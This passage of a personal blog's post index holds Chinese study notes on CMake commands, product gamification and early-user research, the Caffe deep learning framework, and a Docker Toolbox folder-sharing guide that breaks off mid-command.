CMakeLists 文件中定义的变量 输出的文件可以作为源代码文件的一部分引用； options 用来定义可供用户选择的配置项开关，第一个参数是选项变量名，第二个参数是选项提示信息，第三个参数是默认初始值（可选，未注明则默认为 OFF ） 选项只有两种默认值，ON 或者 OFF 例如 option (USE_MYMATH “Use custom math implementation” ON) if 用来设置条件判断， 格式为 if () # command 可由多行组成，每行建议缩进以方便阅读 elseif() else() endif() 示例 if (USE_MATH) include_directories (“${PROJECT_SOURCE_DIR}&#x2F;math”) add_subdirectory (math) set (EXTRA_LIBS ${EXTRA_LIBS} MathFunctions) endif () 一般源文件中也会有基于全局条件变量的部分代码，例如 #ifdef USE_MYMATH #include “math&#x2F;MathFuncitons.h” #else #include #endif set 用来设置变量及其初始值，第一个参数为变量名，第二个参数为变量值，第三个参数是父级作用域 [PARENT_SCOPE]（可选） 格式：set ( … [PARENT_SCOPE]) 我们在 CMakeLists 中设置的变量，是可以在 config.h.in 文件中引用的； 用来设置 CACHE，它用来将某个变量值存储到缓存中，重新运行 cmake 时，会使用缓存值，除非使用 [FORCE] 选项显式的重新赋值； 格式：set ( … CACHE [FORCE]) 其中 type 表示要缓存的变量类型，支持以下五种 BOOL，布尔值，ON&#x2F;OFF 两个值； PATH，文件夹路径 FILEPATH，文件名路径； STRING，字符串 INTERNAL，同 STRING，也是字符串；据说是隐式的 FORCE，暂时不知道使用场景； 用来对缓存的变量做简单说明，仅支持字符串格式； 用来设置环境变量 格式：set (ENV{} []) install 用来设置安装规则，DESTINATION 用来表示要安装的目标路径，FILES 用来表示文件安装规则，TARGETS 用来表示target 目标的安装规则 示例 install (TARGETS Demo DESTINATION bin) install (FILES “${PROJECT_BINARY_DIR}&#x2F;conifig” DESTINATION include) add_test 用来添加测试用例，格式为 add_test (NAME COMMAND […]) 第一个参数表示测试用例的名称，第二个名称表示要执行的测试命令，第三个参数表示测试选项 示例：add_test (test_5_2 Demo 5 2) enable_testing 用来表示启用测试，可以没有参数 示例：enable_testing( ) set_tests_properties 用为设置测试的参数，一般用来验证测试结果是否正确，格式 set_tests_properties (test1 [test2…] PROPERTIES prop1 value1 prop2 value2) 其中 test1, test2 等表示测试用例的名称，通过 add_test 指令设定； 示例 set_tests_properties (test_5_2 PROPERTIES PASS_REGULAR_EXPRESSION “is 25”) include 加载指定的CMake文件或模块，以便加载并运行文件或模块中的 CMake 代码，格式为 include (&lt;file | module&gt; [OPTIONAL]) 示例 include (${CMAKE_ROOT}&#x2F;Modules&#x2F;CheckFunctinExists.cmake) 问题：Modules 是哪来的？CMake 自带的； check_function_exists 用来检查某个 C 函数是否可以被链接，格式为：check_function_exists( ) 第一个参数 function 表示系统标准库提供的函数名，第二个参数是用来存储结果的变量 variable （临时创建，存储在缓存中） 示例 include (${CMAKE_ROOT}&#x2F;Modules&#x2F;CheckFunctionExists.cmake) # 需要先引入 CMake 自带的宏文件 check_function_exists (pow HAVE_POW) find_package 用来查找并导入外包的库 格式： find_package( [version] [EXACT] [QUIET] [MODULE] [REQUIRED] [[COMPONENTS] [components…]] [OPTIONAL_COMPONENTS components…] [NO_POLICY_SCOPE]) REQUIRED 选项，表示该库文件是必须的，没有找到会终止 CMake 执行并退出； 示例：find_package( OpenCV REQUIRED ) 这个指令执行完毕后，会有一些内置变量保存查询结果，包括 _FOUND， foreach 对列表中的元素进行遍历，并对每个元素执行一遍指令 格式 foreach( ) endforeach() 这个命令可以用来执行多个子项目的编译； 添加编译选项 SET (GCC_COMPLIE_FLAGS “-lrt”) add_definitions(${GCC_COMPLIE_FLAGS}) 场景 构建安装包 CMakeLists 配置 include (InstallRequiredSystemLibraries) # 导入包安装的模块 set (CPACK_RESOURCE_FILE_LICENSE “${CMAKE_CURRENT_SOURCE_DIR}&#x2F;License.txt”) # 设置版本声明变量 set (CPACK_PACKAGE_VERSION_MAJOR “${Demo_VERSION_MAJOR}”) # 设置大版本号 set (CPACK_PACKAGE_VERSION_MINOR “${Demo_VERSION_MINOR}”) # 设置小版本号 include (CPack) # 导入CPack 包； 命令行执行的命令 cpack -C CPackConfig.cmake # 生成二进制安装包 或者 cpack -C CPackSourceConfig.cmake # 生成源码安装包","categories":[{"name":"工具","slug":"工具","permalink":"http://example.com/categories/%E5%B7%A5%E5%85%B7/"}],"tags":[{"name":"C++","slug":"C","permalink":"http://example.com/tags/C/"},{"name":"C","slug":"C","permalink":"http://example.com/tags/C/"}]},{"title":"产品游戏化","slug":"产品游戏化","date":"2019-04-14T09:01:00.000Z","updated":"2024-09-22T23:08:41.988Z","comments":true,"path":"2019/04/14/产品游戏化/","permalink":"http://example.com/2019/04/14/%E4%BA%A7%E5%93%81%E6%B8%B8%E6%88%8F%E5%8C%96/","excerpt":"","text":"前言 人们为什么玩游戏？因为游戏从另外一个维度丰富了人们的人生体验！ 猜测：游戏将会越来越成为我们生活中不可或缺的一部分，技术进步的速度，慢慢将超过人类的进化和学习速度，知识的大爆炸，可能会使得很多人成为无用阶级。如果让人们释放多余的时间，重新寻找人生的意义，游戏或许一种方式，就像电影《头号玩家》里面的世界一样； 就像《原则》一书里面提到的，追求进化是人类的基因天性。但在现实世界中，由于不确定因素太多，超过了个人可以掌握的范围，因此现实世界中的进化对于大多数人来说是可望而不可及的。但虚拟的游戏，通过良好的难度设计，可以弥补这一方面的不足； 成功游戏的共同特征，在于遵循一条原则：快乐的本质，来源于培养技能，增进技能，精通技能，获得对世界的掌握感； 角色是我们的身份象征，我们通过身份来定位自己在世界中的价值；因此，不要忘记通过角色蜕变，为用户提供成就感； 注意思考如何让用户在使用产品的过程中，感受到愉悦 愉悦是一种对大脑的奖赏，它会强化某些行为变成习惯； 产品黏性 &#x3D; 自治 + 精通 + 目标 自治：一种控制自己命运的感觉。选择权在自己手上的感觉。何时以及如何向用户提供选择，让用户能够遵循自己的兴趣，去探索世界； 精通：打造技能、反馈、挑战；不要让玩家觉得太容易，要在挑战基础上的技能收获，才能给予人们成就感，并持续追求这种成就感； 目标：与某些伟大的东西产生联系 伟大的东西，能够提供意义感，例如运动步数与慈善捐赠，通过故事来传达意义等； 没有一款游戏会让所有人喜爱，但这不并重要，重要的是让目标用户喜欢就行，因为在接触某个游戏前，人们的主观偏好是已经客观存在的； 短期奖励只能够带来短期的黏性，长期的黏性来自于用户的内部驱动力；很多时候，外部奖励甚至会伤害内部驱动力，例如阅读和画画会让人愉悦，但如果是出于金钱的奖励进行阅读，内在的愉悦感便会消失； 好的产品，不仅仅停留在满足用户的需求，它还更进了一步，帮忙用户实现个人成长，在他们觉得有意义的领域，变得更加擅长； 在进行游戏化产品设计时，其中有一个环节是为用户画出成长的路径； 第1章：为产品制定一个清晰化的策略 策略 提出设想，进行验证，加以改进； 推出最小可行性产品； 最小可行性产品画布 早期用户是谁？ 即使需求普遍存在，早期愿意尝鲜的永远只有少数人；只有当一款产品的用户数超过某个临界点时，才会被典型人群所授受； 因此，一开始的推广应该聚集于有迫切问题需要解决的使用者；原因：他们被问题困扰，因此愿意冒险尝试新方案，同时也愿意忍受新方案早期可能产生的混乱； 谁将成为首批25-50个狂热的早期用户？ 他们的待满足需求是什么？ 验证他们的问题是否真实存在； 我们的价值主张是什么？ 验证我们提供的价值是否能够被人们认同； 我们的解决方案是什么？ 验证我们解决方案是否足够简单、有效、方便； 我们有什么不公平优势？ 验证我们是否比竞争对手做的好； 早期需要设定哪些数据指标？ 使用产品的意愿分数； 为产品付费的意愿分数； 将产品分享给其他人的意愿分数； 关键设想是什么？ 对前面六点的设想进行重要性排序，优先对其中重要但没有把握的设想进行验证； 对于用户的待满足需求，我们会想到一个解决方案，但事实上，在用户的心中，有很多种解决方案；他们会优先选择最简单、最方便、最有效的那种；因此，应该去多接触客户，了解他们当前是如何解决他们面临的问题的；从中很有可能发现一些更好的解决方案，然后我们可以吸收到产品里面来； 早期开发产品的陷阱 一开始就想从典型用户切入，不关注早期用户； 不能冷静的做用户的倾听者，从用户中获取更多的解决方案，反而急于教育用户； 执着于大规模数据分析，忽视创新产品在早期不可能具备大规模用户数据的背景； 追求漂亮和完美，它会带来情感阻碍和时间成本；对于早期产品，先追求功能才是有意义的，视觉效果只需保持简单； 第2章：草拟一份有意义的产品简介 为同一个用户问题，多准备几个解决方案，然后同时对它们进行验证；这样就不会过于执着某一种单一的方案，导致拒绝接受现实的反馈； 研究计划 什么人：拥有某些特征的**人群； 什么设想：设计早期访谈方案，或者试玩，以便能够验证某个设想； 什么时候：当什么设想验证后即可开始启动？ 什么地方：调研的地理位置，如在线，面对面等； 什么目标：收集用户的需求，以及关于解决方案的反馈，以便能够及时调整产品方向； 调研模板 我们的用户喜欢做什么。。。（日常习惯） 我们的一些用户认为……（观点或信念） 我们的一些用户希望能够自己实现……（待满足需求） 我们的一些用户愿意为……付费（待提供的服务） 我们的大部分用户尝试过……（主要竞品）； 了解目标用户是在什么场景中使用我们的产品，然后亲自到这些场景中去转转，体验一下；这样会收获很多关于自己的产品如何被使用的信息，以及更有针对性的产品改进方案； 第3章：找到产品的超级粉丝 招募早期超级粉丝用户的途径 直接发电子邮件，前提是有他们的电邮地址； 利用朋友的朋友的社交媒体传播； 兴趣圈：例如某种兴趣的微信群，通过加入群，联系群主，请求帮助； 聚会与研讨会：当参加某种会议的时候，利用会议间隙发言介绍自己； 筛选器：三个多项选择题，三个开放式问题，注意事项： 调查越短，得到的回答会越多； 行为是比想法更有力的信号； 超级粉丝都会积极试图解决问题（因此从开放性的回答情况可以识别此类群体） 超级粉丝对事情如何才会变更更好有自己的观点；因此，应该设计一个询问用户关于如何做才能让事情有所改进的问题； 从回收的50-100份调查中，筛选出粉丝用户； 注意事项 注意招募渠道与目标用户的匹配；如果招募渠道的反响率不理想，应该考虑理性其他招募渠道； 招募信息效果不好，考虑修改得写招募信息；可以考虑撰写多份招募信息，然后小范围的 A&#x2F;B 测试，找出效果比较好的那份； 一定要找到最精准的细分人群，不管他们多么小都没有关系，关键是要精准，越细分越好；不精准的用户会带来误导的负作用； 第4章：发现用户的相关习惯和需求 早期使用者的特点：由于他们面临问题的困扰，所以他们对于新解决方案的尝试，是主动的，不需要他人说服；早期大多数则会观望其他人的态度； 快速访谈：访谈的时间应简短而高效，对于面谈的双方来说都有利；两个面谈者之间应该休息30分钟，这段时间可以用来做一些总结和调整； 根据访谈的整理，访谈问题也可以根据信息反馈，实时的进行调整； 寻找超级粉丝的筛选问题（此处假设与产品相关的活动为“它”） 在你最日常的一天中，它处于什么地位？ 目的：了解与产品相关的活动或痛点，是否确实以及频繁出现于日常生活里，了解问题的发生场景，了解人们的行为习惯； 解决这个问题，你曾经尝试过哪些方案？对你来说，这些方案奏效了吗？是如何奏效的？ 目的：从人们所采取的行动中，可以辨别人们的真实态度；区分出那些真正的早期使用用者； 你的解决方案正在奏效吗？如果它能够更好的奏效，你的生活会有什么改变吗？ 目的：评估用户对新方案的渴求的强烈程度 最有效的方法，最无效的方案，各是什么？ 它如何才能变得更好，更简单？还有什么遗漏没？ 做好预期，不是每个人都能够提出创新的思考； 如果你有一根魔法杖，你想改变什么？ 如果可能的话，尽量配备一个搭档，一个负责面谈，一个负责记录，两人轮换； 原因：两双眼睛，两个大脑，会发掘出更多的用户行为模式； 面谈后，从面谈数据中寻找普遍存在的用户行为模式，他们是产品方案和创意的来源地； 注意事项 避免访谈时间过长； 访谈的目的在于发现用户，发现需求，发现痛点；因此，避免让访谈时间过长，避免推销自己的方案，也避免询问产品定价，不然访谈容易发生扭曲； 避免访谈个人化和情绪化；注意在访谈过程中保持礼貌和冷静的态度； 第5章：将用户意见转化为工作叙述 在打造产品之前，应先理解核心用户的需求、习惯和令他们感到困扰的问题； 工作叙述（以下简直就是《习惯的力量》中所描述的“暗示-行动-奖赏”的翻版） 当在什么时候，或者在什么样的外界信息的触发下（触发点）； 我想要采取（行动） 由此我希望能够达成（奖赏） 在获得用户的调研数据并进行分析时，注意发现是否存在以下几个模式： 现存的某种习惯； 待满足的需求； 痛点； 创意或建议； 人们的触发点常常是心理情感层面的，而其所希望达成的奖赏，也因此是心理情感层面的；例如感到疲惫-&gt;想要平静，感到负罪-&gt;想要自由，感到焦虑-&gt;想要自信；因此，产品的设计应该与用户的这些情感建立纽带，包括： 共情：理解用户的习惯、痛点和心理需求；（此处有必要单独写一份习惯叙述，因为它非常非常重要） 叙述：使用文字的方式，抓住和写下这些待满足的情感需求； 方案：设计产品，为满足这些情感需求提供解决方案； 不要试图让用户建立新的行为习惯，而应该先发现用户的旧习惯，然后利用这些旧习惯，添加使用产品的一些小行为，与旧习惯融为一体，或者直到它慢慢的取代旧习惯； 当写好了工作叙述后，尝试将它们与用户的语录进行匹配，看是否能够相互印证；如果不行的话，或许表示工作叙述可能写错了； 注意事项 避免过早的去建立基于人口统计学的角色模型 原因：这样做会容易模糊对于早期使用者的聚集，变成了考虑早期大多数； 研究者偏见：人们的天性是乐意寻求支持自己观点的证据，然后忽略与观点不同的证据； 为了避免这种认知偏差，对于模式的识别，应该去找一些与产品利益不相关的人员，帮忙一起分析数据，看他们是否也从中发现了相同的模式 当发现早期使用者没有什么习惯与现有产品产生关联时，就要当心了，因为这意味着要给用户打造全新的使用习惯，这样做的难度很大；相比之下，寻找另外一批早期用户可能是更稳妥的做法 第6章：为产品设计一条独特的精通路径 人类的基因中有天生向往进步和精通的冲动，设计的产品的时候，要围绕这一点，去设计如何让用户在使用产品的过程中，获得升级； 带领用户走上一条他们自己的英雄之路，让他们知道整个故事的终点是什么，让他们为了这个终点，愿意学习和磨炼自己的技能，去达到最终的目标； 思考当用户在使用产品的时候，他们在培养什么样的技巧，获取什么的知识，这些都是他们实现个人转变的原因； 用户想要提升哪些指标，是什么让他们觉得提升这些指标对他们有意义？ 随着用户技巧的提升，有什么新的特权、能力或通道会为他们开放？ 用户体验的路径分成四个阶段 发现 人们会因为产品的价值主张或者产品创意所吸引，然后开始尝试使用产品； 产品的消息传递应该足够清晰，以便吸引真正的用户，同时排除并过滤掉非目标用户； 以用户的角度，写一份发现叙述，以便可以用来设计产品的消息传递方案 当我发现一款产品时，我想要理解这款产品的价值主张，于是我就能够判断它是否值得尝试； 启程 从发现到二次使用，中间有一个巨大的鸿沟，而启程的目标，就是填补这道鸿沟，它要回答下面这些用户心中的问题 产品是如何运转的？ 我如何能快速熟悉系统，并且开始获得价值？ 这里有什么东西是我所需要的？ 我为什么要为它投入时间？ 启程叙述 当我第一次加入这个体系时，我希望自己是受欢迎的；我希望能够尽快熟悉情况，并且达成一些小目标；这样，我就能快速从中获取价值； 习惯打造 尝试回答下面的问题 是什么现实的需求或者习惯用户使用我们的产品？ 在使用产品的过程中，用户会收获什么样的技巧和能力？ 当用户没有或失去这些技巧或者能力的时候，他们是否会感受到负面的情绪，例如焦虑，不安，孤独？ 习惯叙述模板 当我在这个产品中登录时 我可以在这里看到新鲜或者个性化的内容、活动、挑战、比赛或者一些人； 这样我就可以获得满足感，也就是获得了我想要的结果； 精通 在用户在产品投入的时间越来越多时，我们是否能够打造一个简化版的虚拟现实，让用户在这个虚拟现实中，实现另外一种人生； 数字本身并没有什么意义，重点在于角色的转变，因为它能够让人欲罢不能；在人们实现角色转变的过程中，他们会收获崇高的地位、社区影响力等回报； 产品黏性 &#x3D; 自治 + 精通 + 目标 1. slack 是一款工具而非游戏，但它通过让用户定制化，帮忙用户实现不断用得越来越好的精通之路； 不是每个用户都想精通，但有少部分用户浸入更深，学到更多，实现更大的影响力；这种情况称之为“元老游戏”；应该给最好的好些用户，一款“元老游戏”； 炫耀自己辛苦获得的技能和知识，这是专家用户压倒一切的需求；因此有必要在产品中创建这种角色，帮助用户实现这种需求； 对于用户的投入，最引人入胜的回报是影响力，在开发基于社区的产品时，要搞清楚如何赋予热情的用户权力，让他们在系统中扮演有意义的角色； 精通叙述模板 当我努力试图精通这个系统时 我希望获取的是权力、机会、特权、或报酬； 于是我们就一直黏在产品上，接受挑战，并且获取影响力； 与超级粉丝共同创建精通系统 这个问题不要在早期过早考虑，而应该等到超级粉丝出现的时候再来考虑； 游戏帮助用户在虚拟世界中提升技能，而产品帮助用户在现实世界中提升技能； 设计你的学习闭环 学习闭环 1. 学习闭环与习惯闭环的不同点在于，它帮助用户更加擅长他所在乎的某种事物，而习惯闭环则侧重是完成一次习惯行为的重现； 学习闭环应包括以下四个方面 提供可重复的、愉悦的活动，能被内部事件所触发； 可重复的、愉悦的活动是关键点；活动是最基本的单位，如果没有事情给用户做，他就不会回到产品中； 提供反馈，驱动用户进行学习和提升技能； 在合适的时间给出合适的反馈，让用户觉得好像有一个教练在旁边指导，总结，和鼓励； 即使是最小可行性产品，也要记得设计反馈功能； 提供进阶，吸引用户再次投入时间使用产品； 用来提升用户的学习动力，让用户觉得在增加自己技能时，有更多的乐趣，获得了更多的回报； 投入会让用户更舍不得离开； 让用户感觉自己在产品中进行了投入的办法 值得一看的统计数据； 让用户诉说他的故事：让用户有机会讲述他们经历的事，可以与其他用户分享这些故事； 提升自我形象：让用户可以定制自己的形象； 帮助用户与人们连接； 给用户用来消费的虚拟货币； 触发事件 两种类型 内部事件：用户的情感、冲动或者渴求，比如孤独、激动、期待、好奇、无聊； 条件性事件：各种日常行为习惯； 利用用户现有的情感和习惯，来设计触发事件最为有效； 行动 有效设计学习闭环：观察并思考用户在某种情境下的低层情感需求和高层理想目标，结合这两者提供解决方案； 例如下班的父母，低层是放松自己，高层是教育小孩，所以他们希望有一个既然放松自己又能教育小孩的解决方案； 围绕最基本的活动（可重复、令人愉悦），打造第一个原型； 思考 设计什么样的反馈，能够帮助用户更好的进行核心活动？ 如何利用机制，让统计数据与有意义关联起来？ 陷阱 没有吸引力、无聊的核心活动 重新打磨核心活动，确保它们是令人愉悦并且可重复； 依赖外部触发因素 开发黏性活动的强烈的价值主张； 忘记关闭闭环 创建提示，让用户知道自己在持续投入； 社交！ 人类总是喜欢创建一个系统，以简化的模式解释这个世界 这应该是大脑的工作机制，不然我们无法处理大量的信息； 不同的人享受乐趣的种类也是不同的； 社交行为矩阵 在线环境中的四种行为：竞争、合作、探索、表达； 1. 陷阱 试图填满所有象限 识别最能表达用户驱动力的两个象限即可 混淆进阶与竞争 在填充社交行为矩阵前，先规划出用户个人的进阶路径； 画出你的产品原型图 越早测试，收益越高，长远来看也更节省时间； 运用原型工具，迅速把创意和想法变成现实，抵制过度设计的冲动； 对于可交互的原型，应该让其尽量简单，以便让用户将注意力集中在需要得到反馈的元素上； 如果自己都对产品的聚焦点不清楚，则此时做可交互的原型没有多大用处；用草图配以口头场景说明解释足够； 对于硬件原型，用胶带拼凑零件也是可行的； 竞品也可以用来做测试，让用户试玩竞品，然后让他们介绍他们是如何使用的；从中可以了解到用户的想法和观点； 陷阱 聚焦于“发现”和“启程” 为核心活动做原型，而不是营销或推广信息； 用户体验和图片完美主义 在产品的早期阶段不要考虑； 过度开发原型 使用原型制作工具，而不是写代码来制作原型； 用核心用户测试你的创意 如果原型很简单，则每次测试花费半小时；如果原型很复杂，则花费一个小时；目的是确保得到足够多的反馈； 如果产品是单人使用，则一对一测试；如果是多人使用，则应该多人测试，这样才能更好的还原使用场景，了解人们的互动过程； 测试流程 热身 提问或追问一些问题，了解更多想知道的信息； 告知对方目前当前阶段的测试目的； 测试：展示原型，并让用户试玩； 布置任务，并要求他们把想法说出来； 如果是成对测试，则此时可以让用户之间彼此交谈； 简报 询问他们试玩之后的感受，评价产品是否能够适用他们的业务场景，是否能够帮忙解决他们的问题； 其他问题 习惯和触发事件 什么时候会用到这款产品； 用之前、之中、后会做什么？ 喜欢和不喜欢 对于这次体验，最喜欢的是什么？ 对于这次体验，最不喜欢的是什么？ 哪些东西我想要改进？ 如果你可以随意变化产品中的东西，希望看到什么东西有所变化？ 如果用户有提到他们拿来对比的其他产品和工具，务必记录下来； 注意事项 两个搭档，做为测试引导者和记录者进行分工，轮流互换角色； 穿着上注意让用户感到放松； 总结测试 什么才是最关键的发现；这个用户群体喜欢什么，不喜欢什么？ 证实了哪些设想？哪些设想需要重新修订或评估？ 学到的最让自己吃惊的事情是什么？ 陷阱 替代测试者说话 闭嘴； 虚假的正面反馈； 保持中立而礼貌的态度； 冷淡的反应 注意测试者强烈的情感，以及在态度上感兴趣的点； 更新你的产品战略 在获得调研的信息后，更新自己在以下几方面的认知：待满足需求、价值主张、解决方案、不公平优势、早期指标、关键设想； 陷阱 验证范围失控 测试要聚集于一些设想，保持专注； 迷失于细节 只传达那些与产品相关的、有实践操作层面意义的信息； 虚假的负面结果导致产品转向 不要过度反应，记住目标是什么，概率化思考； 画出你核心行为的原型图 不同阶段的不同工作重心 1. 最小可行性产品阶段：注重用户习惯的打造，找到能够让用户经常回到产品上的“钩子”，即使这种“钩子”看上去很原始，很粗糙； 常见陷阱 错：对于迭代实验支持力度低 向同事安利相关理念，教育他们快速迭代的重要性 错：对精通系统进行过度设计 先集中精力调试好学习闭环后，之后利用超级粉丝的反馈来设计精通系统，不要靠自己想当然； 错：倾听的目的不是找到问题，而是找到解决方案 注意倾听要解决的本质问题，而不是用户给出的方案，因为用户的方案常常并不是最好的；","categories":[{"name":"计算机","slug":"计算机","permalink":"http://example.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA/"}],"tags":[{"name":"产品","slug":"产品","permalink":"http://example.com/tags/%E4%BA%A7%E5%93%81/"}]},{"title":"深度学习-21天实战Caffe","slug":"深度学习-21天实战Caffe","date":"2019-04-04T04:10:00.000Z","updated":"2024-09-22T23:08:43.598Z","comments":true,"path":"2019/04/04/深度学习-21天实战Caffe/","permalink":"http://example.com/2019/04/04/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0-21%E5%A4%A9%E5%AE%9E%E6%88%98Caffe/","excerpt":"","text":"基本知识 ubuntu 安装 caffe sudo apt-get install git sudo apt-get install libprotobuf-dev libleveldb-dev libsnappy-dev libopencv-dev libhdf5-serial-dev protobuf-compiler sudo apt-get install –no-install-recommends libboost-all-dev sudo apt-get install libatlas-base-dev sudo apt-get install python-dev sudo apt-get install libgflags-dev libgoogle-glog-dev liblmdb-dev 命令行参数处理的两个常用工具：getopt，gflags； caffe 使用 lmdb 和 leveldb 两个工具来实现数据格式的标准化，这样有助于简化模型，避免因为输入数据格式多种多样，产生适配困难； Caffe 代码梳理 目录结构 include 存放头文件，src 存放源代码，tools 存放常用工具； 如何有效的阅读源码 从 src&#x2F;caffe&#x2F;proto&#x2F;caffe.proto 开始，了解基本数据结构的内存对象和磁盘文件的一一映射关系（将文件加载到内存对象，和将内存对象保存为文件）； 看头文件：通过头文件声明理解整个框架（可以发挥想象力去猜测具体实现） 有针对性的看 cpp 和 cu 文件； 编写各种工具，集成到 tools 中 tools 下面本身已经有很多实用的工具，包括训练模型、测试模型、特征提取、转换数据格式等，可以根据需要修改； 也可以使用 python 或者 matlab 包装 Caffe 的方法，便于调节模型训练效果； Caffe 支持哪些深度学习特性 卷积层 大自然中一种常见的运算，一切信号的观测、采集、传输、处理都可以使用卷积过程来实现； 卷积层的计算为三维或四维的计算；与二维相比，在于增加了多个通道，每个通道仍然使用二维卷积的方法计算，多个通道与多个卷积核分别进行二维卷积，得到多通道的输出，之后再“合并”为一个通道； 卷积计算时没有“翻转”，而是做滑动窗口计算； 全连接层 每个节点与相邻的所有节点都有连接关系，所以叫“全连接层”； CNN 网络中，前几层卷积层参数量占比小，但计算量大；后几层全连接层参数占比大，但计算量小；因此，在做计算速度优化时，重点放在卷积层；而在做参数优化、权值剪裁时，重点放在全连接层； 激活函数 激活函数是一个非线性处理单元；用来将前面一层的输入，压缩到特定的值域； 当深度神经网络配备上激活函数后，理论就可以逼近任意函数； 常用的激活函数有 Sigmoid、tanh、ReLU 等三类，其中前两个是饱和激活函数，最后一个是非饱和激活函数； Caffe 数据结构 Blob Blob 基本用法 Blob 是个四维数组，用来存储各种数据，例如图像、权值等；维度从低到高分别为 width, height, channels, num； 在进行网络计算时，每层的输入和输出都需要通过 Blob 对象进行缓冲；它是 Caffe 的基本存储单元； Blob 可以通过下标，其访问方式跟数组下标的访问方式一致； 据说 Blob 可以实现 CPU 和 GPU 的数组同步，好奇是如何实现的呢？ 猜测：如果仅仅是数组，正常应该是通过 CUDA 实现数据的拷贝吧； blob 的方法 count()，获取元素个数； mutable_cpu_data()，获取源值数组在 CPU 主存中的指针； mutable_gpu_data()，获取源值数组在 GPU 显存中的指针； mutable_cpu_diff()，获取差值数组在 CPU 主存中的指针； mutable_gpu_diff()，获取差值数组在 GPU 显存中的指针； Update()，将 mutable_cpu_data 与 mutable_cpu_diff 两个数组整合，实现 data &#x3D; data - diff 的操作； data_at()，获取指定下标位置的值； asum_data() ，用来实现所有元素的绝对值之和（L1 范数）； sumsq_data() ，用来实现所有元素的平方和（L2范数）； shape_string()，获取维度（字符串格式）； ToProto(&amp;bp, true)，将 Blob 对象序列化，第二个参数表示是否携带 diff 数组（默认不带） BlobProto bp; a.ToProto(&amp;bp, true); WriteProtoToBinaryFile(bp, “a.blob”); FromProto(bp2, true)，从序列化对象中初始化 Blob 对象，第二个参数表示是否连同形状 BlobProto bp2; ReadProtoFromBinaryFileOrDie(“a.blob”, &amp;bp2); Blob b; b.FromProto(bp2, true); 数据结构描述 BlobShape 和 BlobProto 本质上是两个结构体，不过用对象进行了封装，这样可以隐藏复杂性，简化调用过程，减少出错概率； Blob 实现 Blob 类的详细源代码，各种方法的具体实现过程； Layer 基本原理 一般由四部分组成，它们都是使用 Blob 存储； 必有：一个输入 Blob，一个输出 Blob； 可选：权值(Weight) Blob ，偏置项(Bias) Blob； 两个运算方向 前向传播(Forward)：对输入 Blob 进行处理，得到输出 Blob（如果有权值和偏置项，则它们会参与输出计算）； 反向传播(backward)：对输出 Blob 的 diff 进行处理，得到输入 Blob 的 diff（如果有权值和偏置，则也可能会参与计算）； 数据结构描述 Layer 实现 Net Net 基本用法 对应的描述文件为 *.prototxt； 一般既包含 Layer 对象，也包含 Blob 对象； 数据结构描述： Net 实现 两种类型的 Blob，一种是 param 开头的权值 Blob（归属模型），一种是以 blob 开头的输入和输出 Blob（归属数据） 整个深度学习的过程，就是不断从输入和输出数据 Blob 提取知识，存储到权值 Blob 模型中，用于后来的计算； 机制和策略 机制提供了使用的可能性；策略则提到了具体的使用方法； 机制和策略是相对的概述，当前的策略也可以是上一层更大抽象规则下的机制； Caffe I&#x2F;O 模块 数据读取层：dataLayer 是 Layer 派生类，可以读取 LMDB、LEVELDB，还可以直接从原始图像读取(ImageDataLayer)； 数据结构描述 数据读取层实现 数据变换器 提供了对原始输入图像的预处理方法，包括随机切块、随机镜像、幅度缩放、去均值、灰度&#x2F;色度变换等； 数据结构描述 数据变换器的实现 Caffe 模型 prototxt 表示 内存中的表示 磁盘上的表示 Caffe Model Zoo 模型分享平台；各地研究人员分享模型和参数的平台，通过共享结果，节省人力物力，提高研究效率； Caffe 前向传播计算 Caffe 反向传播计算 Caffe 最优化求解过程 Caffe 实用工具 训练和预测 特征提取 转换图像格式 计算图像均值 自己编写工具 源码阅读 image_data_layer.cpp Image_data_layer 层的实现，实际上也是使用 opencv 来对图像进行变换； ReadImageToCVMat 函数，可以将图片读入的同时，进行尺寸设置； image_data_layer 继承自 BasePrefetchingDataLayer BasePrefetchingDataLayer 则双重继承自 BaseDataLayer 和 InternalThread BaseDataLayer 继承自 Layer； image_data_layer 构造函数以 LayerParameter 为参数；有 DataLayerSetUp 方法进行数据成员设置； 其他事项 待学习如何使用这两个工具； caffe train 使用训练数据集（图片+标签），对模型进行训练，最后得到的结果为权值文件 caffe test ：用 train 的结果（即权值文件），对测试数据集进行测试，检查训练的结果是否达到预期； 专业名词 antialias 抗锯齿 high endian 大端法，low endian 小端法，intel 的处理器使用小端法 问题集 标签数据集是用来存储什么数据？ 如何使用训练好的模型，检测自己的图片？ 如何将自己的图片，转换成 Caffe 可以识别的格式？ 据说要转换成 LMDB 格式才能够被 caffe 识别； 如何使用 LMDB 工具转换图片的格式？ 估计可以在 caffe 目录下的 tools 常用工具文件夹中找找看；","categories":[{"name":"计算机","slug":"计算机","permalink":"http://example.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA/"}],"tags":[{"name":"深度学习","slug":"深度学习","permalink":"http://example.com/tags/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/"}]},{"title":"windows 如何共享本地文件夹到 docker machine","slug":"windows 如何共享本地文件夹到 docker machine","date":"2019-04-03T08:17:46.000Z","updated":"2024-09-21T23:19:34.671Z","comments":true,"path":"2019/04/03/windows 如何共享本地文件夹到 docker machine/","permalink":"http://example.com/2019/04/03/windows%20%E5%A6%82%E4%BD%95%E5%85%B1%E4%BA%AB%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%A4%B9%E5%88%B0%20docker%20machine/","excerpt":"","text":"背景对于 win10 Home 及 win10 以下的系统，目前只能通过 Docker Toolbox 创建 docker machines 办法来使用 docker 注：以下方法是针对 Docker Toolbox 的场景，如果是 Docker for Windows，则方法不同； 原理docker 需要运行在 Linux 环境下，但 Windows 系统中没有 Linux 环境，因此需要先通过 Docker Toolbox 程序中携带的 Oracle VM VisualBox 工具， 先虚拟出 Linux 环境（即 docker machine），之后便可以在这些虚拟环境中使用 docker，就像在一台原生 Linux系统的电脑中使用 docker 一样；我们可以根据需要虚拟出很多台远程的 linux 环境，每一台都有自己的 docker，它们之间不会相互干扰；每个 docker 下面有对应的 images 和 containers； 日常使用假设我们已经创建了一个叫 default 的虚拟 linux 环境（它以远程 linux 主机的形式出现），我们可以通过 docker-machine ssh default 命令，登录这台主机，进入 Linux 环境，然后在里面执行各种 docker 命令，就好像在原生的 Linux 系统上一样； 如何与本地 windows 共享文件夹方法一：使用 Oracle VM VisualBox 方法二：使用命令行123456# 先暂停远程主机 defaultdocker-machine stop default# 